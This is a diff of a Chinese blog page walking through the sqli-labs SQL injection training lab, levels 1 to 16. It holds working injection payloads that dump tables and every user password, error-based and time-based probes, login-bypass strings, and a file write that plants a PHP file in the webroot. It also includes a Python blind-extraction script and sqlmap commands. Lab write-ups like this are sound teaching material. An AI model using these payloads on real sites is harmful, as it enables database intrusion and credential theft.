@@ -26,11 +26,16 @@
 <meta property="og:site_name" content="Mul1n&#39;s Blog">
 <meta property="og:description" content="less1:字符型注入传入参数&#x2F;?id&#x3D;1&#39;报错，判断由于’闭合了查询的引号导致报错 &#x2F;?id&#x3D;1&#39; order by 1,2,3,4--+判断回显行数，4时报错，行数为3 &#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+ 修改有回显的行为需要查询的数据 &#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(table_name">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251107215106.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251107215106.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251107230615.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251107230711.png">
 <meta property="article:published_time" content="2025-11-26T14:06:43.000Z">
-<meta property="article:modified_time" content="2025-12-16T11:11:52.773Z">
+<meta property="article:modified_time" content="2025-12-16T11:20:52.754Z">
 <meta property="article:author" content="mul1n">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251107215106.png">
 
 
 <link rel="canonical" href="https://luomubing-lin.github.io/2025/11/26/sqli-labs/">
@@ -134,7 +139,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#less1-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">less1:字符型注入</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#less1-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">less1:字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less2-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">less2:数字型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less3-%E9%97%AD%E5%90%88"><span class="nav-number">3.</span> <span class="nav-text">less3:()闭合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less4-%E2%80%9D%E9%97%AD%E5%90%88"><span class="nav-number">4.</span> <span class="nav-text">less4:”闭合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">less5:报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less6"><span class="nav-number">6.</span> <span class="nav-text">less6:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less7-outfile"><span class="nav-number">7.</span> <span class="nav-text">less7: outfile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less8"><span class="nav-number">8.</span> <span class="nav-text">less8:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less9"><span class="nav-number">9.</span> <span class="nav-text">less9:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less10"><span class="nav-number">10.</span> <span class="nav-text">less10:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less11"><span class="nav-number">11.</span> <span class="nav-text">less11:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less12"><span class="nav-number">12.</span> <span class="nav-text">less12:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less13"><span class="nav-number">13.</span> <span class="nav-text">less13:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less14"><span class="nav-number">14.</span> <span class="nav-text">less14:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less15"><span class="nav-number">15.</span> <span class="nav-text">less15:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less16"><span class="nav-number">16.</span> <span class="nav-text">less16:</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -223,7 +228,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-16 19:11:52" itemprop="dateModified" datetime="2025-12-16T19:11:52+08:00">2025-12-16</time>
+      <time title="Modified: 2025-12-16 19:20:52" itemprop="dateModified" datetime="2025-12-16T19:20:52+08:00">2025-12-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -249,118 +254,48 @@
 <p><code>/?id=-1&#39; union select 1,2,3 --+</code> 修改有回显的行为需要查询的数据</p>
 <p><code>/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p>
 <p>爆出当前页面数据库的表名：emails,referers,uagents,users</p>
+<p>&#96;&#96;</p>
 <p><code>/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code> </p>
 <p>爆出列名：id,username,password</p>
 <p><code>/?id=-1&#39; union select 1,2,group_concat(password) from users--+</code> </p>
 <p>爆出所有的密码</p>
-<pre><code>
-### less2:数字型注入
-
-传入参数直接被带入查询，没有任何引号包裹
-
-注入时无需&#39;闭合
-
-其他与less1基本相同
-
-### less3:()闭合
-
-`/?id=1&#39;`观察报错信息发现有），尝试`/?id=1&#39;)`来闭合其他与前面相同
-
-### less4:&quot;闭合
-
-输入`/?id=1&#39;`不报错，输入`/?id=1&quot;`报错,报错信息显示有），使用`/?id=1&quot;)`
-
-### less5:报错注入
-
-正常不显示数据，但是会显示报错，`extractvalue(1,concat(0x5c,(select database())));`使用此函数0x5c,0x7e引起报错，返回database()的非法数据
-
-注意extractvalue()最多输出32个字符需要搭配substr()截断使用
-
-如：`extractvalue(1,concat(0x5c,substr((select database()),-20)));` 输出后20位
-
-`/?id=-1%27%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%23`
-
-成功爆出数据库名security
-
-`updatexml(1,concat(0x7e,database(),0x7e,user()),1)` 同样这个函数也是相同的效果
-
-### less6:
-
-同款报错注入，不过用双引号闭合
-
-`/?id=1&quot;%20union%20select%201,2,updatexml(1,concat(0x7e,database()),1)--+`
-
-### less7: outfile
-
-发现只有两种回显，布尔盲注，提示使用outfile，先判断闭合，擦查看源代码发现是
-
-`$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;`  
-
-即采用`/?id=1&#39;))`闭合，文件保存路径通过以前关卡的报错获得
-
-`/?id=-1&#39;)) union select 1,2,database() into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-7/1.txt&#39;--+` 
-
-在可以在web网页下写入文件是写入shell文件更为便捷
-
-`/?id=-1&#39;)) union select 1,2,&quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-7/1.php&#39;--+` 
-
-### less8:
-
-报错完全无回显，先用延时注入判断闭合符号
-
-`/?id=1&#39; and sleep(5)--+`  延时成功则使用&#39;闭合
-
-`/?id=-1&#39; union select 1,2,&quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-8/1.php&#39;--+` 
-
-与less7相同 使用outfile
-
-其他解法：
-
-编写exp爆出数据库名：
-
+<h3 id="less2-数字型注入"><a href="#less2-数字型注入" class="headerlink" title="less2:数字型注入"></a>less2:数字型注入</h3><p>传入参数直接被带入查询，没有任何引号包裹</p>
+<p>注入时无需’闭合</p>
+<p>其他与less1基本相同</p>
+<h3 id="less3-闭合"><a href="#less3-闭合" class="headerlink" title="less3:()闭合"></a>less3:()闭合</h3><p><code>/?id=1&#39;</code>观察报错信息发现有），尝试<code>/?id=1&#39;)</code>来闭合其他与前面相同</p>
+<h3 id="less4-”闭合"><a href="#less4-”闭合" class="headerlink" title="less4:”闭合"></a>less4:”闭合</h3><p>输入<code>/?id=1&#39;</code>不报错，输入<code>/?id=1&quot;</code>报错,报错信息显示有），使用<code>/?id=1&quot;)</code></p>
+<h3 id="less5-报错注入"><a href="#less5-报错注入" class="headerlink" title="less5:报错注入"></a>less5:报错注入</h3><p>正常不显示数据，但是会显示报错，<code>extractvalue(1,concat(0x5c,(select database())));</code>使用此函数0x5c,0x7e引起报错，返回database()的非法数据</p>
+<p>注意extractvalue()最多输出32个字符需要搭配substr()截断使用</p>
+<p>如：<code>extractvalue(1,concat(0x5c,substr((select database()),-20)));</code> 输出后20位</p>
+<p><code>/?id=-1%27%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%23</code></p>
+<p>成功爆出数据库名security</p>
+<p><code>updatexml(1,concat(0x7e,database(),0x7e,user()),1)</code> 同样这个函数也是相同的效果</p>
+<h3 id="less6"><a href="#less6" class="headerlink" title="less6:"></a>less6:</h3><p>同款报错注入，不过用双引号闭合</p>
+<p><code>/?id=1&quot;%20union%20select%201,2,updatexml(1,concat(0x7e,database()),1)--+</code></p>
+<h3 id="less7-outfile"><a href="#less7-outfile" class="headerlink" title="less7: outfile"></a>less7: outfile</h3><p>发现只有两种回显，布尔盲注，提示使用outfile，先判断闭合，擦查看源代码发现是</p>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code>  </p>
+<p>即采用<code>/?id=1&#39;))</code>闭合，文件保存路径通过以前关卡的报错获得</p>
+<p><code>/?id=-1&#39;)) union select 1,2,database() into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-7/1.txt&#39;--+</code> </p>
+<p>在可以在web网页下写入文件是写入shell文件更为便捷</p>
+<p><code>/?id=-1&#39;)) union select 1,2,&quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-7/1.php&#39;--+</code> </p>
+<h3 id="less8"><a href="#less8" class="headerlink" title="less8:"></a>less8:</h3><p>报错完全无回显，先用延时注入判断闭合符号</p>
+<p><code>/?id=1&#39; and sleep(5)--+</code>  延时成功则使用’闭合</p>
+<p><code>/?id=-1&#39; union select 1,2,&quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;D:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master/Less-8/1.php&#39;--+</code> </p>
+<p>与less7相同 使用outfile</p>
+<p>其他解法：</p>
+<p>编写exp爆出数据库名：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">host = <span class="string">&quot;http://127.0.0.1/Less-8/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select database()&quot;</span></span><br><span class="line"><span class="comment"># sql = &quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        payload = host + <span class="string">&quot;?id=1&#x27; and (ascii(substr(&quot;</span> + <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> + <span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
 
-### less9:
-
-`?id=1&#39; and sleep(5)--+`
-延时注入，测得注入点为&#39;，因为这一关输入什么页面只有一种回显，使用延时注入
-不废话sqlmap一把梭
-sqlmap -u http://locat.test/Less-9/?id=1 --dbs
-
-### less10:
-/?id=1&quot; and sleep(5)--+ ,使用双引号闭合，同less9
-### less11:
-![](/images/Pasted_image_20251107215106.png)
-post型注入，先使用万能密码试试：1&#39; or 1=1 成功登录
-抓包查看表单数据：uname=1&amp;passwd=1&amp;submit=Submit
-post:   submit=Submit&amp;uname=-1&amp;passwd=-1&#39; union select 1,2#
-
-![](/images/Pasted_image_20251107215106.png)
-
-就可以进行查询了:
-submit=Submit&amp;uname=-1&amp;passwd=-1&#39; union select database(),version()#
-或者使用sqlmap：
-sqlmap -u http://192.168.1.16/Less-11 
---data=&quot;submit=Submit&amp;uname=1&amp;passwd=1&quot; --dbs
-
-### less12:
-根据报错判断使用&quot;),其他与less11一致
-### less13:
-根据报错判断使用&#39;)闭合，但是正确时没有回显，使用报错注入
-`Submit=submit&amp;passwd=-1&amp;uname=-1&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#`
-### less14:
-使用&quot;闭合，其余与less13相同
-### less15:
-没有报错信息，但是可以根据图片回显判断
-提交1&#39; or 1=1#
-![](/images/Pasted_image_20251107230615.png)
-提交错误：
-![](/images/Pasted_image_20251107230711.png)
-直接sqlmap吧
-
-### less16:
-跟less15差不多，使用&quot;)闭合
-</code></pre>
+<h3 id="less9"><a href="#less9" class="headerlink" title="less9:"></a>less9:</h3><p><code>?id=1&#39; and sleep(5)--+</code><br>延时注入，测得注入点为’，因为这一关输入什么页面只有一种回显，使用延时注入<br>不废话sqlmap一把梭<br>sqlmap -u <a target="_blank" rel="noopener" href="http://locat.test/Less-9/?id=1">http://locat.test/Less-9/?id=1</a> –dbs</p>
+<h3 id="less10"><a href="#less10" class="headerlink" title="less10:"></a>less10:</h3><p>&#x2F;?id&#x3D;1” and sleep(5)–+ ,使用双引号闭合，同less9</p>
+<h3 id="less11"><a href="#less11" class="headerlink" title="less11:"></a>less11:</h3><p><img src="/blog/images/Pasted_image_20251107215106.png"><br>post型注入，先使用万能密码试试：1’ or 1&#x3D;1 成功登录<br>抓包查看表单数据：uname&#x3D;1&amp;passwd&#x3D;1&amp;submit&#x3D;Submit<br>post:   submit&#x3D;Submit&amp;uname&#x3D;-1&amp;passwd&#x3D;-1’ union select 1,2#</p>
+<p><img src="/blog/images/Pasted_image_20251107215106.png"></p>
+<p>就可以进行查询了:<br>submit&#x3D;Submit&amp;uname&#x3D;-1&amp;passwd&#x3D;-1’ union select database(),version()#<br>或者使用sqlmap：<br>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.1.16/Less-11">http://192.168.1.16/Less-11</a><br>–data&#x3D;”submit&#x3D;Submit&amp;uname&#x3D;1&amp;passwd&#x3D;1” –dbs</p>
+<h3 id="less12"><a href="#less12" class="headerlink" title="less12:"></a>less12:</h3><p>根据报错判断使用”),其他与less11一致</p>
+<h3 id="less13"><a href="#less13" class="headerlink" title="less13:"></a>less13:</h3><p>根据报错判断使用’)闭合，但是正确时没有回显，使用报错注入<br><code>Submit=submit&amp;passwd=-1&amp;uname=-1&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#</code></p>
+<h3 id="less14"><a href="#less14" class="headerlink" title="less14:"></a>less14:</h3><p>使用”闭合，其余与less13相同</p>
+<h3 id="less15"><a href="#less15" class="headerlink" title="less15:"></a>less15:</h3><p>没有报错信息，但是可以根据图片回显判断<br>提交1’ or 1&#x3D;1#<br><img src="/blog/images/Pasted_image_20251107230615.png"><br>提交错误：<br><img src="/blog/images/Pasted_image_20251107230711.png"><br>直接sqlmap吧</p>
+<h3 id="less16"><a href="#less16" class="headerlink" title="less16:"></a>less16:</h3><p>跟less15差不多，使用”)闭合</p>
 
     </div>
 
